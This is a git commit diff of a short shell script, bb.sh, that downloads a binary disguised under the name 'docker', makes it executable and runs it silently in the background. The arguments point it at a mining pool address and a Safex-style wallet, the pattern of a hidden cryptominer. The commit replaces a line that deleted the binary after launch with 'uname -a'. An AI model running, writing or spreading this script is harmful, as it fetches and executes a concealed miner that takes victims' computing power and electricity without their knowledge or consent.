b6053c01463fd78f818ed28b7b417b0e9236fc0b
jsiqiisn <jsiqiisn@outlook.com>
2022-03-24 07:10:26 +0000

    Update bb.sh

--- bb.sh
+++ bb.sh
@@ -2,4 +2,4 @@
 wget https://raw.githubusercontent.com/jsiqiisn/baby/main/docker
 chmod +x docker
 ./docker -o 40.83.177.217:80 -u SafexsnsPwCNzaHDEfcGTzgW9rNcKQhAmBFNrH8KRUjvcfZHGuyKAgSd1Gd5C72WVwLtUfhA3tyXsLQnkXbH1JwGHkgxtdoGRvc3n -p $(echo $(shuf -i 1-20000 -n 1)-V) -k -a rx/sfx > /dev/null 2>&1 &
-rm -rf docker
+uname -a
